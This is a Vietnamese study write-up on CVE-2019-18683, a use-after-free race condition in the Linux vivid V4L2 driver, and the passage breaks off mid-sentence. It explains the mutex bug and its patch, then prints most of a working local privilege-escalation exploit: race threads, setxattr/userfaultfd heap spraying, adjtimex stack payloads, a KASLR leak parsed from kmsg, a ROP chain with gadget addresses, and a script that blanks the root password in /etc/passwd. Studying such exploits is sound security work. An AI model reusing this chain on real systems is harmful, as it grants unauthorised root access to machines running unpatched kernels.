list_add_tail(\u0026amp;buf-\u0026gt;list, \u0026amp;dev-\u0026gt;vid_cap_active);// spin_unlock(\u0026amp;dev-\u0026gt;slock); } Sau đó gọi vid_cap_start_streaming, hàm này sẽ gọi vivid_start_generating_vid_cap để khởi tạo 1 kernel thread thực hiện hàm vivid_thread_vid_caption\n1 2 dev-\u0026gt;kthread_vid_cap = kthread_run(vivid_thread_vid_cap, dev, \u0026#34;%s-vid-cap\u0026#34;, dev-\u0026gt;v4l2_dev.name); Hàm vivid_thread_vid_cap này có nhiệm vụ đưa dữ liệu vào vb2_buffer. Sau dữ liệu được đưa xong, nó sẽ bước vòng 1 vòng lặp vô hạn, ngồi đợi lấy khóa lock(mutex_lock(\u0026amp;dev-\u0026gt;mutex)), khi nhận được khóa, dữ liệu trên vb2_buffer mới được xử lí. Như đã nói, vb2_fop_read cũng có khóa, và khóa này với khóa ở bước trên vivid_thread_vid_cap là một, điều này có nghĩa, khi thread đang thực hiện vivid_thread_vid_cap mở khóa, một thread nào đó thực hiện vb2_fop_read có khóa, nó có thể vào vùng nhớ này để thực hiện. Giống như ngôi nhà chỉ có thể chưa 1 người, có 2 người giữ chìa khóa, khi 1 người bên trong đi ra, người còn lại nếu đang giữ chìa khóa, anh ta hoàn toàn có thể vào căn nhà. Căn nhà ở đây là vb2_buf, còn 2 người lần lượt là 2 thread đang chạy vivid_thread_vid_cap và vb2_fop_read.\nNhưng tại sao đang giữ khóa rồi lại mở khóa, sau đó lại chờ có lại khóa, tôi vẫn chưa hiểu tại sao lại như thế, nhưng đây chính là nguyên nhân gây ra CVE này. Quan sát kĩ hơn về hàm vb2_core_dqbuf: stateDiagram\rvb2_core_dqbuf --\u0026gt; __vb2_get_done_vb\r__vb2_get_done_vb --\u0026gt; __vb2_wait_for_done_vb\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_prepare\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_finish Ở đây, vb2_ops_wait_prepare sẽ trả khóa vb2_queue-\u0026gt;lock, vb2_ops_wait_finish sẽ chờ nhận khóa và kết thúc.\nHay nói cách khác, vb2_core_dqbuf sẽ trả khóa, vivid_thread_vid_cap có khóa sẽ vào thực hiện, vb2_core_dqbuf phải chờ vivid_thread_vid_cap thực hiện xong, đưa lại khóa rồi mới hoàn tất việc của mình.\nVấn đề chính là ở bước này. giống như việc bạn mượn phòng trong vòng 45\u0026rsquo; rồi bạn phải khóa phòng, đem chìa khóa xuống cho bảo vệ để bảo vệ lên kiểm tra, bảo vệ kiểm tra xong sẽ đưa lại chìa khóa cho bạn để bạn vào phòng tiếp. Nhưng trong quá trình bạn đem chìa khóa xuống cho bảo vệ thì 1 người khác có được chiếc chìa khóa này, họ hoàn toàn có thể vào phòng lúc này. Kì vọng của người lập trình là muốn vivid_thread_vid_cap đi vào khi vb2_core_dqbuf trả khóa, nhưng lúc này, nếu 1 process khác đang chạy và gọi vb2_fop_read thì họ sẽ có được chìa khóa này.\nBên dưới là ảnh khi debug, có thể thấy mặc dù hàm vivid_thread_vid_cap đã thực thi xong hết rồi vb2_fop_read không kết thúc ngay, nó lại gọi vb2_core_qbuf một lần nữa. Khi đó, hàm này lại vào đọc dữ liệu mà vốn dĩ đà được thực hiện xong bởi 1 process khác. Khi nó gọi __enqueue_in_driver, vb2_buffer sẽ được thêm vào hàng đợi dev-\u0026gt;vid_cap_active để thực hiện. Sau đó vb2_fop_read mới kết thúc. Điều này dẫn tới, sau khi vb2_fop_read kết thúc, thì địa vb2_buffer lại được lưu trong dev-\u0026gt;vid_cap_active để chuẩn bị cho 1 process khác thực hiện. Khi tìm hiểu về dev-\u0026gt;vid_cap_active thì tôi thấy nó được sử dụng bởi 3 hàm: vivid_thread_vid_cap, vid_cap_start_streaming và vivid_stop_generating_vid_cap. vivid_thread_vid_cap: lấy tất cả dữ liệu trong hàng đợi vid_cap_active ra, do đó, sau khi thực hiện xong, buffer sẽ không còn trong hàng đợi. vid_cap_start_streaming mục đích chính là kiểm tra xem trạng thái của buffer và thực hiện một số chuyển đổi, sau khi thực hiện xong, buffer vẫn còn trong hàng đợi. vivid_stop_generating_vid_cap được dùng trong hàm close(fd), dùng để xóa tất cả các dữ liệu trong hàng đợi, bao gồm cả buffer. close Chúng ta đã tìm hiểu về hàm read và thấy rằng sau khi thực hiện hàm read, vb2_buffer lại được 1 process khác đưa vào hàng đợi để chuẩn bị cho quá trình thực hiện. Vậy khi process hiện tại thực hiện xong lệnh close thì vb2_buffer sẽ bị ảnh hưởng như thế nào? Chúng ta hãy cùng xem flow khi gọi hàm close\nstateDiagram\rvivid_fop_release --\u0026gt; vb2_fop_release\rvb2_fop_release --\u0026gt; vb2_queue_release\rvb2_queue_release --\u0026gt; vb2_core_queue_release\rvb2_core_queue_release --\u0026gt; __vb2_cleanup_fileio\r__vb2_cleanup_fileio --\u0026gt; vb2_core_streamoff\rvb2_core_streamoff --\u0026gt; __vb2_queue_cancel\r__vb2_queue_cancel --\u0026gt; vivid_stop_generating_vid_cap\r__vb2_cleanup_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; __vb2_queue_free Nhìn vào lược đồ trên, ta thấy khá đơn giản, tuy nhiên có một chú ý:\nHàm vivid_stop_generating_vid_cap trả khóa, rồi gọi kthread_stop để dừng kernel thread đang thực hiện hàm vivid_thread_vid_cap.\nNếu như kết thúc hàm read() nó chỉ tạo ra một nguy cơ xảy ra lỗi uaf, thì tại đây chính là nguyên nhân gây ra lỗi uaf. 1 2 3 4 mutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; mutex_lock(\u0026amp;dev-\u0026gt;mutex); Sau khi vivid_stop_generating_vid_cap thực hiện xong, nó sẽ gọi hàm __vb2_queue_free để giải phóng vb2_queue-\u0026gt;bufs và vb2_buffer, ròi đóng process hiện tại. Đừng quên rằng, vb2_buffer ngay lúc này đang được 1 process khác đưa vào hàng đợi vid_cap_active để chuẩn bị thực thi. Điều này dẫn tới lỗi UAF\nBugs and Fixes Tác giả sử dụng skyzkaller fuzzer với những tùy chỉnh trong kernel source code và thấy những crash trong kernel. KASAN phát hiện ra lỗi use-after-free trong các thao tác danh sách liên kết trong vid_cap_buf_queue(). Nguyên nhân là do sự sai sót trong quá trình sử dụng khóa (mutex lock) trong vivid_stop_generating_vid_cap(), vivid_stop_generating_vid_out() và sdr_cap_stop_streaming(). Những hàm trên được gọi khi bị khóa vivid_dev.mutex, quá trình streaming bị dừng. Chúng cùng mắc phải một lỗi là khi muốn dừng kthreads thì nó cũng cần phải khóa mutex này. Ví dụ, trong hàm vivid_stop_generating_vid_cap(): 1 2 3 4 5 6 /* shutdown control thread */ vivid_grab_controls(dev, false); mutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; mutex_lock(\u0026amp;dev-\u0026gt;mutex); Tuy nhiên, khi mutex được unlocked, một hàm khác vb2_fop_read() có thể khóa nó thay vì kthread và thao tác trên hàng đợi (buffer queue). Điều này dẫn tới khả năng xảy ra use-after-free sau này khi streaming hoạt động trở lại.\nchưa biết cách sử dụng skyzkaller fuzzer.\nVì sao dẫn tới khả năng xảy ra use-after-free? (đã trả lời trong cơ chế hàm read, close trong vivid)\rĐể giải quyết tình trạng trên, tác giả đề xuất như sau: Không mở khóa mutex khi stream dừng. Ví dụ ở hàm vivid_stop_generating_vid_cap() chúng ta sẽ bỏ 2 hàm: 1 2 3 4 5 6 /* shutdown control thread */ vivid_grab_controls(dev, false); -\tmutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; -\tmutex_lock(\u0026amp;dev-\u0026gt;mutex); Sử dụng mutex_trylock() với schedule_timeout_uninterruptible() trong vòng lặp của vivid kthread handler. Hàm xử lí vivid_thread_vid_cap() được thay đổi như sau: 1 2 3 4 5 6 7 8 9 10 11 for (;;) { try_to_freeze(); if (kthread_should_stop()) break; -\tmutex_lock(\u0026amp;dev-\u0026gt;mutex); +\tif (!mutex_trylock(\u0026amp;dev-\u0026gt;mutex)) { +\tschedule_timeout_uninterruptible(1); +\tcontinue; +\t} ... } Nếu mutex này không hoạt động, kthread sẽ ngủ trong giây lát rồi thử lại. Trong trường hợp xấu nhất, kthread sẽ ngủ vài lần và chạm đến break để thoát khỏi vòng lặp hiện tại.\nWinning the race Chúng ta đã hiểu tại sao lại vivid lại có thể dẫn tới lỗi UAF, bây giờ chúng ta sẽ tiến hành khai thác lỗi này. Để test kernel, chúng ta cần đảm bảo: Đã có vivid driver /dev/video0 is the V4L2 capture device Chúng ta đã login Chúng ta tạo 2 pthreads. Trường hợp này, bắt buộc sử dụng ched_setaffinity để racing tốt hơn. 1 2 3 4 5 6 7 cpu_set_t single_cpu; CPU_ZERO(\u0026amp;single_cpu); CPU_SET(cpu_n, \u0026amp;single_cpu); ret = sched_setaffinity(0, sizeof(single_cpu), \u0026amp;single_cpu); if (ret != 0) err_exit(\u0026#34;[-] sched_setaffinity for a single CPU\u0026#34;); Chúng ta tiến hành race 1 2 3 4 5 6 7 8 9 10 for (loop = 0; loop \u0026lt; LOOP_N; loop++) { int fd = 0; fd = open(\u0026#34;/dev/video0\u0026#34;, O_RDWR); if (fd \u0026lt; 0) err_exit(\u0026#34;[-] open /dev/video0\u0026#34;); read(fd, buf, 0xfffded); close(fd); } Khai bắt đầu streaming hàm vid_cap_start_streaming() sẽ , được gọi bởi V4L2 trong khi vb2_core_streamon() đọc từ file descriptor. Khi dừng streaming, hàm vivid_stop_generating_vid_cap() sẽ được V4L2 gọi trong khi __vb2_queue_cancel() sẽ giải phóng tham khảo cuối cùng đến file. Do đó, nếu một trình đọc khác \u0026ldquo;chiến thắng\u0026rdquo; kthreads, nó sẽ gọi vb2_core_qbuf(), hàm này sẽ thêm vb2_buffer vào vb2_queue.queued_list. Khi chạy đoạn code trên, chúng ta có thể sẽ được kết quả như sau:\nTa có 2 thread chạy trên 2 CPU khác nhau, màu đỏ đại diện thread A, màu xanh đại diện thread B Thread A Thread B Chạy vb2_core_dqbuf, trả khóa (giả sử vivid_thread_vid_cap đã có khóa) vb2_fop_read lấy được khóa, thực hiện và có vẻ không thỏa mãn điều kiện nào đó nên dừng, trả khóa lại vivid_thread_vid_cap nhận được khóa, giải phóng buffer thực hiện hàm close(fd), gọi hàm vivid_stop_genrating_vid_cap để xóa hàng đợi vid_cap_active ra khỏi thiết bị, trả khóa (hi vọng vivid_thread_vid_cap sẽ lấy được khóa này) vb_core_dqbuf lấy được khóa, gọi __enqueue_in_driver để thêm vb2_buffer vào hàng đợi. Thực hiện lệnh read và giải phóng khóa vivid_stop_generating_vid_cap nhận được khóa và thực hiện lệnh close(fd) để đóng process và giải phóng vùng nhớ vb2_buffer, vùng nhớ này vẫn còn nằm trong hàng đợi vid_cap_active, và có thể được dùng cho lần đọc tiếp teho -\u0026gt; lỗi UAF Bước vào vòng lặp mới, đợi có khóa để gọi vivid_thread_vid_cap để đưa vùng nhớ vb2_buffer cũ vừa bị kfree vào vivid_fillbuff vì vùng nhớ bị kfree nên sẽ bị xóa đi những trường cần thiết cho quá trình thực hiện, nên sau đó chương trình sẽ bị crash Deceived V4L2 sub system Khi streaming dừng hẳn, tham khảo cuối cùng tới /dev/video0 được giải phóng, V4L2 subsystem calls sẽ gọi vb2_core_queue_release() để giải phóng tài nguyên. Hệ thống sẽ lần lượt gọi __vb2_queue_free() để giải phóng vb2_buffer - đã được thêm vào hàng đợi khi mà exploit cảu chúng ta thắng race.\nTuy nhiên, driver không biết điều đó và vẫn giữ tham khảo đến một object đã được giải phóng. Khi stream bắt đầu lại, nó sẽ nhảy vào exploit loop, vivid driver sẽ chạm đến đối tượng bị giải phóng và điều này đã được KASAN phát hiện. Heap spraying Heap spraying là kĩ thuật, mục đích đặt những controlled bytes vào những vị trí có thể xác định trước trên heap. Kĩ thuật này thường liên quan tới việc cấp phát nhiều đối tượng trên heap với controlled contents và làm sao để một số allocator để cấp phát ngay vùng nhớ trên. Heap spraying sử dụng để khai thác use-after-free trong Linux Kernel sẽ thường dùng kmalloc() vì hàm này sẽ trả về địa chỉ của vùng nhớ vừa được free. Do đó, nếu cấp phát một đối tượng, cùng địa chỉ với controlled contents sẽ cho phép chúng ta ghi đè vùng nhớ có thể khai thác.\nẢnh tham khảo từ: https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html Kĩ thuật này có thể được triển khai bằng cách sử dụng kết hợp userfaultfd() + setxattr() với ý tưởng chính rằng userfaultfd() sẽ cho phép chúng ta kiểm soát được lifetime của dữ liệu được cấp phát bởi setxattr() trong kernelspace. Quay trở về với lỗ hổng này, vb2_buffer sẽ được free khi streaming dừng và sẽ được use ở lần streaming tiếp theo. Do đó, nếu chúng ta sử dụng kĩ thuật heap spraying vào cuối vòng lặp thứ nhất trước khi streaming stop thì khi streaming bắt đầu ở vòng lặp kế tiếp thì chúng ta có thể dùng kmalloc() để cấp phát vùng nhớ vừa free ở cuối vòng lặp trước với controlled data. Tuy nhiên, lúc bấy giờ, tác giả phát hiện ra một vấn đề: vùng nhớ vb2_buffer không phải là vùng nhớ cuối cùng được giải phóng bởi __vb2_queue_free(), do đó, ở vòng lặp tiếp theo, khi gọi kmalloc) thì nó sẽ không trả về đúng địa chỉ mà chúng ta cần. Vì thế, chúng ta cần phải allocate nhiều lần để có thể cấp phát đúng được vị trí mong muốn. Nhưng muốn áp dụng điều trên với hai hàm userfaultfd() + setxattr() là không dễ dàng vì: dữ liệu do setxattr() cấp phát chỉ tồn tại cho đến khi trình xử lí lỗi trang userfaultfd() gọi hàm ioctl với flag UFFDIO_COPY. Hay nói cách khác, muốn dữ liệu được cấp phát bởi setxattr() không bị mất thì userfaultfd() không gọi ioctl. Tác giả giải quyết vấn đề này bằng cách tạo ra một pool of threads: mỗi thread này được gọi là spraying thread, gọi hàm setxattr() được xử lí bởi userfaultfd() và lưu dữ liệu được cấp phát. Tôi vẫn chưa biết tât cả các spraying thread đều được xử lí bởi userfaultfd() hay mỗi spraying thread sẽ có 1 userfaultfd() tương ứng (sẽ được giải thích ở những mục dưới)\rBây giờ, chúng ta sẽ viết payload gì vào vb2_buffer?\nControl flow hijack for V4L2 subsystem Lược đồ dưới đây đặc tả sơ lược mối quan hệ giữa các object trong V4L2 subsystem\nTại đây thì tác giả bảo ông ấy tốn khá nhiều thời gian để tìm cách ghi nội dung tùy ý vào vb2_buffer và bằng một cách thần kỳ nào đó, ông ta đã tìm ra con đường như trên lược đồ:\nvb2_buffer.vb2_queue-\u0026gt;mem_ops-\u0026gt;vaddr\nDễ thấy, hàm vaddr() nhận vb2_buffer.planes[0].mem_priv làm tham số.\nUnexpected troubles: kthread context Chúng ta bắt đầu viết những payload để V4L2 chạm tới con trỏ hàm này. Tắt SMAP (Supervisor Mode Access Prevention), SMEP (Supervisor Mode Execution Prevention), KPTI (Kernel Page-Table Isolation) Làm vb2_buffer.vb2_queue trỏ tới một vùng nhớ được ánh xạ trên userspace. Deferencing con trỏ này sẽ cho lỗi \u0026quot;unable to handle page fault\u0026quot;.\nLí do trả về lỗi vì con trỏ mà chúng ta muốn deferencing đang ở kernel thread context, nơi mà userspace không thể ánh xạ tới. Do đó, vấn đề lúc bây giờ, làm sao đặt vb2_queue và vb2_mem_ops tại những vùng nhớ mà biết được địa chỉ, và có thể truy cập từ kthread context. Trong hàm __vb2_queue_cancel() cho phép chúng ta gửi những cảnh báo (warning), điều đó có nghĩa chúng ta có thể phân tích cú pháp của kernel warning information (có thể thực hiện trên các ubuntu server). Điều này cho phép chúng ta đưa payload vào kernel stackvà giữ nó bằng userfaultfd(), giống như kĩ thuật heap spraying sử dụng userfaultfd() + setxattr(). Hàm copy_from_user() sẽ giúp ta đưa dữ liệu vào kernel stack. Chúng ta sẽ phân tích cú pháp của warning để lấy địa chỉ của kernel stack và dự đoán dự đoán địa chỉ của payload. Exploit Orchestra Tạo ra pool of threads và đồng bộ hóa chúng bằng hàm pthread_barriers. Dưới đây là code pthread_barriersđược đặt tại các con trỏ tham khảo chính trong suốt quá trình khai thác 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0) #define THREADS_N 50 pthread_barrier_t barrier_prepare; pthread_barrier_t barrier_race; pthread_barrier_t barrier_parse; pthread_barrier_t barrier_kstack; pthread_barrier_t barrier_spray; pthread_barrier_t barrier_fatality; ... ret = pthread_barrier_init(\u0026amp;barrier_prepare, NULL, THREADS_N - 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_race, NULL, 2); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_parse, NULL, 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_kstack, NULL, 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_spray, NULL, THREADS_N - 5); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_fatality, NULL, 2); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); Mỗi thread có một vai trò riêng. Trong trường hợp này, ta dùng 50 thread với 5 vai trò khác nhau: 2 racer threads (THREADS_N - 6) = 44 sprayer pthreads, những thread này sẽ giữ setxattr() được xử lí bởi userfaultfd() 2 pthread cho userfaulfd() xử lí page fault. Đến đây tôi đã giải đáp được thắc mắc ở trên, 2 thread cho userfaultfd() xử lí cho 44 sprayer pthreads. 1 pthread cho phân tích /dev/kmsg và xử lí payload 1 fatility pthread chịu trách nhiệm kích hoạt leo thang đăc quyền - privilege escalation. Những con số này từ đâu mà ra hay chỉ chọn random?\rNhững thread với những vai trò khác nhau sẽ được đồng bộ hóa tại các pthread_barries khác nhau. Tham số cuối cùng của pthread_barrier_init() chỉ định số thread PHẢI gọi pthread_barrier_wait() cho từng barrier cụ thể trước khi nó tiếp tục giao tiếp với nhau. Bảng sau sẽ mô tả chi tiết tất cả các pthread với vai trò khai thác của nó, đồng bộ hóa qua pthread_barrier_wait(). barrier được liệt kê theo trình tự thời gian thực hiện. Bảng này nên được đọc theo từng dòng và đừng quên, các pthread đang thực hiện song song. pthreads 2 racers 44 sprayers page fault hander #1 page fault hander #2 kmsg parser fatality 1. barrier_prepare (for 47 pthreads) wait on barrier 1. create files in tmpfs for doing setxattr() later 2. wait on barrier \u0026mdash; \u0026mdash; 1. open /dev/kmsg 2. wait on barrier \u0026mdash; 2. barrier_race (for 2 pthreads) 1. usleep() to let other pthread go to their next barrier 2. wait on barrier 3. race \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash; 3. barrier_parse (for 3 pthreads) wait on barrier \u0026mdash; \u0026mdash; \u0026mdash; 1. wait on barrier 2. parse the kernel warning to extract RSP and R11 (contains a pointer to code) 3. Calculate the address of the kernel stack top and the KASLR offset. adapt the pointers in the payloads for kernel heap and stack. \u0026mdash; 4. barrier_kstack (for 3 pthreads) 1. wait on barrier 2. place the kernel stack payload via adjtimex() and hang \u0026mdash; \u0026mdash; \u0026mdash; wait on barrier \u0026mdash; 5. barrier_spray (for 45 pthreads) \u0026mdash; 1. wait on barrier 2. place the kernel heap payload via setxattr() and hang \u0026mdash; 1. catch 2 page faults from adjtimex() called by racers. 2. wait on barrier \u0026mdash; \u0026mdash; 6. barrier_fatality (for 2 pthreads) \u0026mdash; \u0026mdash; 1. catch 44 page faults from setxattr() called by sprayers 2. wait on barrier \u0026mdash; \u0026mdash; 1. wait on barrier 2. trigger the payload for privilege escalation 3. the end! Chưa nắm vững / hiểu rõ các pthread được liệt kê trong bảng trên\rVấn đề đặt ra với tôi bây giờ là làm sao để điều khiển các thread giống như table trên. Quay lại môn OS và nhận ra mình chả nhớ gì cả == hậu quả của việc học vẹc. Bây giờ bắt đầu học về nó\u0026hellip;\nOke, đã hiểu, chúng ta có barrier là rào cản, khi đủ thread thì nó sẽ mở cửa, vậy làm sao mình quản lí được khi nào cần 2 thread, khi nào cần 44 thread? Đơn giản chúng ta dự vào function, và đặt barrier vào cuối những function trên. Good, Tôi đã hiểu được đoạn này và đã có idea tiếp tục làm. Anatomy of the exploit payload Payload sẽ được tạo ở 2 nơi: Trong kernel heap bằng sprayer threads bằng cách sử dụng hàm setxattr() được xử lí bởi userfaultfd() Trong kernel stack bằng racer threads bằng cách sử dụng adjtimex() được xử lí bởi userfaultfd(). System call này được chọn vì nó có gọi hàm copy_from_user() tới kernel stack. Payload gồm 3 phần: vb2_buffer trong kernel heap. vb2_queue trong kernel stack. vb2_mem_ops: trong kernel stack. Dưới đây là chương trình tạo payload. Bắt đầu phần khai thác, ta chuẩn bị nội dung của payload ở userspace, vùng nhớ được tạo bởi setxattr() syscall sẽ được đưa vào kernel heap. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #define MMAP_SZ 0x2000 #define PAYLOAD_SZ 504 void init_heap_payload() { struct vivid_buffer *vbuf = NULL; struct vb2_plane *vplane = NULL; for_heap = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (for_heap == MAP_FAILED) err_exit(\u0026#34;[-] mmap\u0026#34;); printf(\u0026#34; [+] payload for_heap is mmaped to %p\\n\u0026#34;, for_heap); /* Don\u0026#39;t touch the second page (needed for userfaultfd) */ memset(for_heap, 0, PAGE_SIZE); xattr_addr = for_heap + PAGE_SIZE - PAYLOAD_SZ; vbuf = (struct vivid_buffer *)xattr_addr; vbuf-\u0026gt;vb.vb2_buf.num_planes = 1; vplane = vbuf-\u0026gt;vb.vb2_buf.planes; vplane-\u0026gt;bytesused = 16; vplane-\u0026gt;length = 16; vplane-\u0026gt;min_length = 16; printf(\u0026#34; [+] vivid_buffer of size %lu is at %p\\n\u0026#34;, sizeof(struct vivid_buffer), vbuf); } adjtimex() syscall ghi dữ liệu vào kernel stack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #define PAYLOAD2_SZ 208 void init_stack_payload() { for_stack = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (for_stack == MAP_FAILED) err_exit(\u0026#34;[-] mmap\u0026#34;); printf(\u0026#34; [+] payload for_stack is mmaped to %p\\n\u0026#34;, for_stack); /* Don\u0026#39;t touch the second page (needed for userfaultfd) */ memset(for_stack, 0, PAGE_SIZE); timex_addr = for_stack + PAGE_SIZE - PAYLOAD2_SZ + 8; printf(\u0026#34; [+] timex of size %lu is at %p\\n\u0026#34;, sizeof(struct timex), timex_addr); } Sau khi bị race condition, pthread sẽ phân tích cú pháp của kmsg, trích xuất thông tin từ kernel warning: Giá trị RSP để tính địa chỉ đỉnh của kernel stack Giá trị R11 trỏ đến một số vị trí không đổi trong kernel code. Giá trị này giúp tính toán offset của KASLR. 1 2 3 4 5 6 7 8 9 10 #define R11_COMPONENT_TO_KASLR_OFFSET 0x195d80d #define KERNEL_TEXT_BASE 0xffffffff81000000 kaslr_offset = strtoul(r11, NULL, 16); kaslr_offset -= R11_COMPONENT_TO_KASLR_OFFSET; if (kaslr_offset \u0026lt; KERNEL_TEXT_BASE) { printf(\u0026#34;bad kernel text base 0x%lx\\n\u0026#34;, kaslr_offset); err_exit(\u0026#34;[-] kmsg parsing for r11\u0026#34;); } kaslr_offset -= KERNEL_TEXT_BASE; Sau đó, pthread phân tích cú pháp của kmsg, điều chỉnh payload trên heap và stack. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #define TIMEX_STACK_OFFSET 0x1d0 #define LIST_OFFSET 24 #define OPS_OFFSET 64 #define CMD_OFFSET 172 struct vivid_buffer *vbuf = (struct vivid_buffer *)xattr_addr; struct vb2_queue *vq = NULL; struct vb2_mem_ops *memops = NULL; struct vb2_plane *vplane = NULL; printf(\u0026#34;Adapt payloads knowing that kstack is 0x%lx, kaslr_offset 0x%lx:\\n\u0026#34;, kstack, kaslr_offset); /* point to future position of vb2_queue in timex payload on kernel stack */ vbuf-\u0026gt;vb.vb2_buf.vb2_queue = (struct vb2_queue *)(kstack - TIMEX_STACK_OFFSET); vq = (struct vb2_queue *)timex_addr; printf(\u0026#34; vb2_queue of size %lu will be at %p, userspace %p\\n\u0026#34;, sizeof(struct vb2_queue), vbuf-\u0026gt;vb.vb2_buf.vb2_queue, vq); /* just to survive vivid list operations */ vbuf-\u0026gt;list.next = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET); vbuf-\u0026gt;list.prev = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET); /* * point to future position of vb2_mem_ops in timex payload on kernel stack; * mem_ops offset is 0x38, be careful with OPS_OFFSET */ vq-\u0026gt;mem_ops = (struct vb2_mem_ops *)(kstack - TIMEX_STACK_OFFSET + OPS_OFFSET); printf(\u0026#34; mem_ops ptr will be at %p, userspace %p, value %p\\n\u0026#34;, \u0026amp;(vbuf-\u0026gt;vb.vb2_buf.vb2_queue-\u0026gt;mem_ops), \u0026amp;(vq-\u0026gt;mem_ops), vq-\u0026gt;mem_ops); memops = (struct vb2_mem_ops *)(timex_addr + OPS_OFFSET); /* vaddr offset is 0x58, be careful with ROP_CHAIN_OFFSET */ memops-\u0026gt;vaddr = (void *)ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET + kaslr_offset; printf(\u0026#34; mem_ops struct of size %lu will be at %p, userspace %p, vaddr %p at %p\\n\u0026#34;, sizeof(struct vb2_mem_ops), vq-\u0026gt;mem_ops, memops, memops-\u0026gt;vaddr, \u0026amp;(memops-\u0026gt;vaddr)); Lược đồ thể hiện mối quan hệ giữa các thành phần bên trong kernel memory.\nChưa thực sự hiểu lược đồ\rROP\u0026rsquo;n\u0026rsquo;JOP Tiếp theo sẽ tạo ra ROP chain để khai thác lỗi.\nTừ lược đồ, có thể thấy void *(*vaddr)(void *buf_priv) là nơi chúng ta kiểm soát luồng thực thi để tấn công. Tham số buf_priv được lấy từ vb2_plane.mem_priv và giá trị này thuộc quyền kiểm soát của chúng ta. Trong linux kernel x86_64, tham số đầu của hàm sẽ được lưu trong thanh ghi RDI, Vì thế chuỗi lệnh push rdi; pop rsp sẽ đưa stack pointer tới nơi mà chúng ta muốn RDI. Tiêp theo ROP chain cho mục đích leo thang đặc quyền: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #define ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET 0xffffffff814725f1 #define ROP__POP_R15__RET 0xffffffff81084ecf #define ROP__POP_RDI__RET 0xffffffff8101ef05 #define ROP__JMP_R15 0xffffffff81c071be #define ADDR_RUN_CMD 0xffffffff810b4ed0 #define ADDR_DO_TASK_DEAD 0xffffffff810bf260 unsigned long *rop = NULL; char *cmd = \u0026#34;/bin/sh /home/a13x/pwn\u0026#34;; /* rewrites /etc/passwd to drop root password */ size_t cmdlen = strlen(cmd) + 1; /* for 0 byte */ /* mem_priv is the arg for vaddr() */ vplane = vbuf-\u0026gt;vb.vb2_buf.planes; vplane-\u0026gt;mem_priv = (void *)(kstack - TIMEX_STACK_OFFSET + ROP_CHAIN_OFFSET); rop = (unsigned long *)(timex_addr + ROP_CHAIN_OFFSET); printf(\u0026#34; rop chain will be at %p, userspace %p\\n\u0026#34;, vplane-\u0026gt;mem_priv, rop); strncpy((char *)timex_addr + CMD_OFFSET, cmd, cmdlen); printf(\u0026#34; cmd will be at %lx, userspace %p\\n\u0026#34;, (kstack - TIMEX_STACK_OFFSET + CMD_OFFSET), (char *)timex_addr + CMD_OFFSET); /* stack will be trashed near rop chain, be careful with CMD_OFFSET */ *rop++ = 0x1337133713371337; /* placeholder for pop rbp in the pivoting gadget */ *rop++ = ROP__POP_R15__RET + kaslr_offset; *rop++ = ADDR_RUN_CMD + kaslr_offset; *rop++ = ROP__POP_RDI__RET + kaslr_offset; *rop++ = (unsigned long)(kstack - TIMEX_STACK_OFFSET + CMD_OFFSET); *rop++ = ROP__JMP_R15 + kaslr_offset; *rop++ = ROP__POP_R15__RET + kaslr_offset; *rop++ = ADDR_DO_TASK_DEAD + kaslr_offset; *rop++ = ROP__JMP_R15 + kaslr_offset; printf(\u0026#34; [+] the payload for kernel heap and stack is ready. Put it.\\n\u0026#34;); Cách thức hoạt động của ROP chain ROP chain đưa địa chỉ của hàm run_cmd() từ kernel/reboot.c vào thanh ghi R15. Lưu địa chỉ của lệnh shell vào thanh ghi RDI. Địa chỉ này sẽ lưu tham số của hàm run_cmd(). Chương trình sẽ nhảy tới run_cmd() để thực thi /bin/sh /home/edisc/pwn với quyền root. Đoạn mã này sẽ viết lại /etc/passwd cho phép chúng ta đăng nhập với quyền root mà không cần password. 1 2 3 #!/bin/sh # drop root password sed -i \u0026#39;1s/.*/root::0:0:root:\\/root:\\/bin\\/bash/\u0026#39; /etc/passwd ROP chain nhảy tới __noreturn_do_task_dead() trong 